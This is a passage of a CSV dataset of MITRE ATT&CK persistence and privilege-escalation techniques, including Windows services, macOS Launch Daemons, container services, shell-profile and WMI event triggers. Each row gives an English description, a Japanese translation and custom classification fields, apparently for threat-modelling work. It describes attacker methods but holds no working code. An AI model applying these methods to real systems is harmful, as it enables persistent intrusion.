攻撃者は、システムへの永続化を図るため、新規サービスのインストールや既存サービスの起動時実行設定変更を行う可能性があります。サービス構成は、システムユーティリティ（sc.exeなど）、レジストリの直接編集、またはWindows APIとの直接連携によって設定・変更できます。 攻撃者はまた、悪意のあるドライバをインストールおよび実行するためにサービスを利用する場合があります。例えば、ドライバファイル（例：`.sys`）をディスクにドロップした後、`CreateServiceW()`などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数（または`ZwLoadDriver()`や`ZwSetValueKey()`などの関数による手動操作）を介してペイロードをロードおよび登録できます。 （あるいは`ZwLoadDriver()`や`ZwSetValueKey()`などの関数による手動操作）、必要なサービスレジストリ値の作成（すなわち[レジストリ変更](https://attack.mitre.org/techniques/T1112)）、または`PnPUtil.exe`などのコマンドラインユーティリティの使用によって行われます。（引用元：Symantec W.32 Stuxnet Dossier）（引用元：Crowdstrike DriveSlayer February 2022）（引用元：Unit42 AcidBox June 2020）攻撃者は、これらのドライバを[ルートキット](https://attack.mitre.org/techniques/T1014)として活用し、システム上の悪意のある活動の存在を隠蔽する可能性があります。 攻撃者はまた、特権昇格のためのエクスプロイトの一環として、署名済みだが脆弱なドライバを侵害マシンにロードする（「Bring Your Own Vulnerable Driver」（BYOVD）として知られる）可能性がある。(引用元: ESET InvisiMole 2020年6月)(引用元: Unit42 AcidBox 2020年6月) サービスは管理者権限で作成されるがSYSTEM権限で実行されるため、攻撃者はサービスを利用して権限昇格を行うことも可能である。攻撃者は[サービス実行](https://attack.mitre.org/techniques/T1569/002)を通じてサービスを直接起動することもできる。 検出分析を困難にするため、悪意のあるサービスは[偽装タスクまたはサービス](https://attack.mitre.org/techniques/T1036/004)を組み込む場合もある（例：正当なOSや良性のソフトウェアコンポーネントに関連するサービス名やペイロード名を使用）。 攻撃者は、`sc sdset` コマンドを使用してサービス記述子定義言語 (SDDL) 経由でサービス権限を設定するなど、`隠されたサービス`（すなわち、[アーティファクトの隠蔽](https://attack.mitre.org/techniques/T1564)）を作成することもあります。 これにより、`Get-Service`、`sc query`、`services.exe` などの標準的なサービス列挙手法から Windows サービスを隠蔽できる。(引用: SANS 1)(引用: SANS 2),persistence;privilege-escalation,Windows,script_command_execution,privilege_gain,privileged_account;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32,2020-01-17T19:13:50.402Z,2025-04-15T19:58:16.076Z,,,,
T1543.004,T1543,Launch Daemon,Launch Agent,"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists) Adversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection) Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",攻撃者は、永続化の一環として悪意のあるペイロードを実行するために起動デーモンを作成または変更する可能性があります。起動デーモンは、macOS が使用するサービス管理フレームワークである Launchd と連携するために使用される plist ファイルです。起動デーモンはインストールに昇格された権限を必要とし、システム上の全ユーザーに対してログイン前に実行され、ユーザーの操作を必要とせずにバックグラウンドで動作します。 macOSの初期化起動時、launchdプロセスは<code>/System/Library/LaunchDaemons/</code>および<code>/Library/LaunchDaemons/</code>にあるplistファイルから、オンデマンド起動のシステムレベルデーモン用パラメータを読み込みます。 必要な起動デーモンのパラメータには、タスクを識別する<code>Label</code>、実行ファイルへのパスを指定する<code>Program</code>、タスクの実行タイミングを指定する<code>RunAtLoad</code>が含まれます。起動デーモンは、共有リソースへのアクセス提供、ソフトウェアの更新、自動化タスクの実行などに頻繁に使用されます。(引用: AppleDocs Launch Agent Daemons)(引用: Methods of Mac Malware Persistence)(引用: launchd Keywords for plists) 攻撃者は、<code>RunAtLoad</code> パラメータを <code>true</code> に設定し、<code>Program</code> パラメータを悪意のある実行ファイルのパスに設定することで、起動時に実行されるように構成された Launch Daemon をインストールする可能性があります。 デーモン名は、関連するオペレーティングシステムや良性のソフトウェアの名前を使用して偽装される場合があります（例：[偽装](https://attack.mitre.org/techniques/T1036)）。 Launch Daemon が実行されると、プログラムは管理者権限を継承します（引用元：WireLurker）（引用元：OSX Malware Detection）。さらに、システム設定の変更（サードパーティのパッケージ管理ソフトウェアのインストールなど）により、<code>usr/local/bin</code> などのフォルダがグローバルに書き込み可能になる場合があります。 したがって、不適切な設定により、攻撃者が現在のLaunch Daemonのplistファイルで参照される実行可能ファイルを変更できる可能性があります。（引用元：LaunchDaemon Hijacking）（引用元：sentinelone macos persist Jun 2019）,persistence;privilege-escalation,macOS,config_policy_manipulation,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba,2020-01-17T19:23:15.227Z,2025-04-15T19:58:33.604Z,,,,
T1543.005,T1543,Container Service,コンテナサービス,"Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host. For example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host.(Citation: AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.(Citation: GTFOBins Docker) In Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation: Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020) Note that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation: Podman Systemd)(Citation: Docker Systemd)",攻撃者は、個々のホスト上でデーモン、エージェント、またはサービスとして動作するコンテナまたはコンテナクラスタ管理ツールを作成または改変する可能性があります。これには、DockerやPodmanなどの個々のコンテナを作成・管理するソフトウェアや、kubeletなどのコンテナクラスタノードレベルエージェントが含まれます。これらのサービスを改変することで、攻撃者はホスト上で永続性を獲得したり、権限を昇格させたりできる可能性があります。 例えば、`docker run` または `podman run` コマンドに `restart=always` ディレクティブを指定することで、コンテナをホスト上で永続的に再起動するよう設定できます。(引用元: AquaSec TeamTNT 2023) (root権限を持つ) docker コマンドへのアクセス権を持つユーザーも、ホスト上で権限昇格が可能となる場合があります。(引用元: GTFOBins Docker) Kubernetes環境では、DaemonSetにより攻撃者はクラスターに後から追加されたノードを含む全ノードにコンテナを永続的に[デプロイ](https://attack.mitre.org/techniques/T1610)できます。(引用元: Aquasec Kubernetes Attack 2023)(引用元: Kubernetes DaemonSet) Podは、Pod仕様内の`nodeSelector`または`nodeName`フィールドを使用して特定のノードにデプロイすることも可能です。(引用元: Kubernetes Assigning Pods to Nodes)(引用元: AppSecco Kubernetes Namespace Breakout 2020) なお、コンテナは[Systemdサービス](https://attack.mitre.org/techniques/T1543/002)として実行するよう設定することも可能です。(引用: Podman Systemd)(引用: Docker Systemd),persistence;privilege-escalation,Containers,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--b0e54bf7-835e-4f44-bd8e-62f431b9b76a,2024-02-15T13:41:46.784Z,2025-04-15T22:10:00.252Z,,,,
T1546,,Event Triggered Execution,イベントトリガー型実行,"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001) Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware) Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",攻撃者は、特定のイベントに基づいて実行をトリガーするシステムメカニズムを利用して、永続化や権限昇格を図ることがあります。各種オペレーティングシステムには、ログオンや特定のアプリケーション/バイナリの実行といったユーザー活動を監視・サブスクライブする手段が備わっています。クラウド環境においても、特定のクラウドイベントを監視し、それに応じて呼び出される様々な機能やサービスがサポートされている場合があります。(引用: AWSアカウントへのバックドア設置)(引用: Varonis Power Automateデータ窃取)(引用: Microsoft DARTケースレポート001)攻撃者は、悪意のあるコードを繰り返し実行することで被害者への永続的アクセスを維持する手段として、これらのメカニズムを悪用する可能性がある。被害者システムへのアクセス権を取得後、攻撃者はイベントトリガーを作成/変更し、トリガー発動時に実行される悪意のあるコンテンツを指し示すように設定する。(引用: FireEye WMI 2015)(引用: OS X におけるマルウェアの永続化)(引用: amnesia マルウェア) SYSTEM やサービスアカウントなど、より高い権限を持つアカウントによって実行がプロキシされる可能性があるため、攻撃者はこれらのトリガーされた実行メカニズムを悪用して特権を昇格させることが可能である。,privilege-escalation;persistence,Linux;macOS;Windows;SaaS;IaaS;Office Suite,data_exfiltration,privilege_gain,user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db,2020-01-22T21:04:23.285Z,2025-04-15T22:28:46.740Z,,,,
T1546.001,T1546,Change Default File Association,デフォルトのファイル関連付けの変更,"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened. System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command</code>. For example: * <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code> The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)",攻撃者は、ファイルタイプ関連付けによってトリガーされる悪意のあるコンテンツを実行することで永続性を確立する可能性があります。ファイルが開かれる際、そのファイルを開くために使用されるデフォルトプログラム（ファイル関連付けまたはハンドラーとも呼ばれる）が確認されます。ファイル関連付けの選択はWindowsレジストリに保存され、レジストリへのアクセス権を持つユーザー、管理者、プログラム、または組み込みのassocユーティリティを使用する管理者によって編集可能です。(引用: Microsoft Change Default Programs)(引用: Microsoft File Handlers)(引用元: Microsoft Assoc Oct 2017) アプリケーションは、特定の拡張子を持つファイルが開かれた際に任意のプログラムを呼び出すよう、そのファイル拡張子のファイル関連付けを変更できる。システムファイル関連付けは<code>HKEY_CLASSES_ROOT\.[拡張子]</code>（例: <code>HKEY_CLASSES_ROOT\.txt</code>）にリストされる。 これらのエントリは、<code>HKEY_CLASSES_ROOT\\[handler]</code> に位置するその拡張子のハンドラを指します。各種コマンドは、<code>HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command</code> のシェルキー配下のサブキーとしてリストされます。例： * <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code> 上記キーの値は、ハンドラがファイル拡張子を開く際に実行されるコマンドです。 攻撃者はこれらの値を改変し、任意のコマンドを継続的に実行させることが可能です。(出典: TrendMicro TROJ-FAKEAV OCT 2012),privilege-escalation;persistence,Windows,script_command_execution,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c,2020-01-24T13:40:47.282Z,2025-04-15T19:58:52.605Z,,,,
T1546.002,T1546,Screensaver,スクリーンセーバー,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code> on 64-bit Windows systems, along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence: * <code>SCRNSAVE.exe</code> - set to malicious PE path * <code>ScreenSaveActive</code> - set to '1' to enable the screensaver * <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)",攻撃者は、ユーザーの非アクティブ状態によってトリガーされる悪意のあるコンテンツを実行することで、永続性を確立する可能性があります。スクリーンセーバーは、ユーザーが設定可能な時間非アクティブ状態になった後に実行されるプログラムであり、.scr ファイル拡張子を持つポータブル実行可能ファイル (PE) で構成されています。(引用元: Wikipedia Screensaver) Windowsスクリーンセーバーアプリケーションscrnsave.scrは、<code>C:\Windows\System32\</code>および64ビットWindowsシステムでは<code>C:\Windows\sysWOW64\</code>に、基本Windowsインストールに含まれるスクリーンセーバーと共に配置されています。 以下のスクリーンセーバー設定はレジストリ（<code>HKCU\Control Panel\Desktop\</code>）に保存され、永続化を達成するために操作される可能性があります：* <code>SCRNSAVE.exe</code> - 悪意のあるPEファイルのパスに設定* <code>ScreenSaveActive</code> - スクリーンセーバーを有効にするには'1'に設定* <code>ScreenSaverIsSecure</code> - 解除にパスワード不要にするには '0' に設定 * <code>ScreenSaveTimeout</code> - スクリーンセーバー実行前のユーザー非操作タイムアウトを設定攻撃者は、ユーザーが一定時間操作しない場合にマルウェアを実行するようスクリーンセーバーを設定することで、持続性を維持できます。(引用元: ESET Gazer 2017年8月),privilege-escalation;persistence,Windows,credential_abuse,privilege_gain,authentication_system;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf,2020-01-24T13:51:01.210Z,2025-04-16T20:37:21.356Z,,,,
T1546.003,T1546,Windows Management Instrumentation Event Subscription,Windows Management Instrumentation イベントサブスクリプション,"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015) Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts  Eusing `mofcomp.exe` –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018) WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",攻撃者は、Windows Management Instrumentation (WMI) イベントサブスクリプションによってトリガーされる悪意のあるコンテンツを実行することで、永続性と特権昇格を確立する可能性があります。 WMIは、定義されたイベント発生時にコードを実行するイベントフィルター、プロバイダー、コンシューマー、バインディングのインストールに使用できる。サブスクライブ可能なイベントの例としては、壁時計時刻、ユーザーログイン、コンピュータの稼働時間などがある。(引用元: Mandiant M-Trends 2015) 攻撃者はWMIの機能を利用してイベントをサブスクライブし、そのイベント発生時に任意のコードを実行することで、システム上での永続性を確保する可能性がある。(引用元: FireEye WMI SANS 2015)(引用元: FireEye WMI 2015) 攻撃者はまた、`mofcomp.exe`を使用してWMIスクリプトをWindows Management Object (MOF)ファイル（.mof拡張子）にコンパイルし、悪意のあるサブスクリプションを作成するために使用できる。(引用: Dell WMI Persistence)(引用: Microsoft MOF May 2018) WMI サブスクリプションの実行は WMI プロバイダホストプロセス (WmiPrvSe.exe) によってプロキシされるため、SYSTEM 権限の昇格につながる可能性があります。,privilege-escalation;persistence,Windows,script_command_execution,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58,2020-01-24T14:07:56.276Z,2025-04-15T19:58:50.950Z,,,,
T1546.004,T1546,Unix Shell Configuration Modification,Unix シェル設定の変更,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",攻撃者は、ユーザーのシェルによってトリガーされる悪意のあるコマンドを実行することで永続性を確立する可能性があります。ユーザー[Unixシェル](https://attack.mitre.org/techniques/T1059/004)は、セッション中のさまざまな時点において、イベントに基づいて複数の設定スクリプトを実行します。例えば、ユーザーがコマンドラインインターフェースを開いたり、SSH経由などでリモートログインしたりすると、ログインシェルが起動されます。 ログインシェルは、システム（<code>/etc</code>）およびユーザーのホームディレクトリ（<code>~/</code>）からスクリプトを実行して環境を設定します。 システム上のすべてのログインシェルは起動時に/etc/profileを使用します。これらの設定スクリプトはディレクトリの権限レベルで実行され、環境変数の設定、エイリアスの作成、ユーザー環境のカスタマイズに頻繁に使用されます。シェルが終了または終了する際には、シェルが適切に終了することを保証するために追加のシェルスクリプトが実行されます。攻撃者は、シェルによって自動的に実行されるスクリプトにコマンドを挿入することで、永続性を確立しようとする可能性があります。 例として、ほとんどのGNU/Linuxシステムでデフォルトシェルであるbashでは、攻撃者は<code>/etc/profile</code>および<code>/etc/profile.d</code>ファイルに悪意のあるバイナリを起動するコマンドを追加することがあります。(引用元: intezer-kaiji-malware)(引用元: bencane blog bashrc) これらのファイルは通常、変更にroot権限を必要とし、システム上のシェルが起動されるたびに実行されます。 ユーザーレベル権限では、攻撃者は<code>~/.bash_profile</code>、<code>~/.bash_login</code>、または<code>~/.profile</code>に悪意のあるコマンドを挿入できます。これらはユーザーがコマンドラインインターフェースを開くかリモート接続する際に読み込まれます。(引用元: anomali-rocke-tactics)(引用元: Linux マニュアル bash 起動) システムはリストされた順序で最初に存在するファイルのみを実行するため、攻撃者は <code>~/.bash_profile</code> を使用して実行を保証しています。 攻撃者はまた、リモート接続時やコマンドラインインターフェースの新規タブなど追加の対話型シェル起動時に追加実行される<code>~/.bashrc</code>ファイルも悪用しています。(引用: Tsunami)(引用: anomali-rocke-tactics)(引用: anomali-linux-rabbit)(引用: Magento) 一部のマルウェアはプログラム終了時をトリガーとして実行されるため、攻撃者はセッション終了時に悪意のあるコマンドを実行するために<code>~/.bash_logout</code>ファイルを利用できる。macOSではこの手法の機能は類似しているが、macOS 10.15以降のデフォルトシェルであるzshを活用する場合がある。Terminal.appが起動されると、アプリケーションはzshログインシェルとzsh対話型シェルを起動する。 ログインシェルは<code>/etc/profile</code>、<code>/etc/zshenv</code>、<code>/etc/zprofile</code>、<code>/etc/zlogin</code>を用いてシステム環境を設定する。(引用元: ScriptingOSX zsh)(引用元: PersistentJXA_leopitt)(引用元: code_persistence_zsh)(引用元: macOS MS office sandbox escape)ログインシェルはその後、<code>~/.zprofile</code>と<code>~/.zlogin</code>でユーザー環境を設定します。対話型シェルは<code>~/.zshrc</code>を使用してユーザー環境を設定します。終了時には<code>/etc/zlogout</code>と<code>~/.zlogout</code>が実行されます。 レガシープログラムについては、macOS は起動時に <code>/etc/bashrc</code> を実行します。,privilege-escalation;persistence,Linux;macOS,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2,2020-01-24T14:13:45.936Z,2025-04-15T19:59:00.346Z,,,,
T1546.005,T1546,Trap,トラップ,"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where ""command list"" will be executed when ""signals"" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)",攻撃者は割り込み信号によってトリガーされる悪意のあるコンテンツを実行することで永続性を確立する可能性があります。<code>trap</code>コマンドは、割り込み信号を受信した際に実行されるコマンドをプログラムやシェルが指定することを可能にします。一般的な状況として、<code>ctrl+c</code>や<code>ctrl+d</code>といった一般的なキーボード割り込みを処理し、正常に終了させるためのスクリプトが挙げられます。 攻撃者はこれを悪用し、シェルが特定の割り込みを検知した際に実行されるコードを永続化メカニズムとして登録できます。トラップコマンドの形式は次の通りです：<code>trap 'コマンドリスト' シグナル</code>。ここで「コマンドリスト」は「シグナル」受信時に実行されます。(引用元: Trapマニュアル)(引用元: Cyberciti Trapステートメント),privilege-escalation;persistence,macOS;Linux,script_command_execution,privilege_gain,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--63220765-d418-44de-8fae-694b3912317d,2020-01-24T14:17:43.906Z,2025-04-25T14:46:52.100Z,,,,
T1546.006,T1546,LC_LOAD_DYLIB Addition,LC_LOAD_DYLIB の追加,"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes. Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)",攻撃者は、汚染されたバイナリの実行によってトリガーされる悪意のあるコンテンツを実行することで永続性を確立する可能性があります。Mach-Oバイナリには、バイナリがロードされた際に特定の操作を実行するために使用される一連のヘッダーがあります。 Mach-Oバイナリ内のLC_LOAD_DYLIBヘッダーは、実行時にロードすべき動的ライブラリ（dylib）をmacOSおよびOS Xに指示します。他のフィールドや依存関係を調整すれば、コンパイル済みバイナリにこれらを任意に追加できます（出典: Writing Bad Malware for OSX）。こうした変更を行うツールも存在します。 攻撃者は、バイナリが実行されるたびに悪意のあるdylibをロードして実行させるため、Mach-Oバイナリのヘッダーを改変する可能性があります。バイナリが改変されるため、いかなる変更もバイナリのデジタル署名を無効にしますが、これは単にバイナリからLC_CODE_SIGNATUREコマンドを削除し、ロード時に署名がチェックされないようにすることで対処可能です。（引用元: Malware Persistence on OS X）,privilege-escalation;persistence,macOS,script_command_execution,privilege_gain,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847,2020-01-24T14:21:52.750Z,2025-04-16T20:37:15.460Z,,,,
T1546.007,T1546,Netsh Helper DLL,Netsh ヘルパー DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>. Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)",攻撃者は、NetshヘルパーDLLによってトリガーされる悪意のあるコンテンツを実行することで永続性を確立する可能性があります。Netsh.exe（Netshellとも呼ばれる）は、システムのネットワーク構成と対話するために使用されるコマンドラインスクリプトユーティリティです。ユーティリティの機能を拡張するためのヘルパーDLLを追加する機能を備えています。(引用元: TechNet Netsh) 登録済み netsh.exe ヘルパー DLL のパスは、Windows レジストリの <code>HKLM\SOFTWARE\Microsoft\Netsh</code> に格納される。攻撃者は netsh.exe ヘルパー DLL を利用して、永続的な方法で任意のコード実行をトリガーできる。 この実行は、netsh.exe 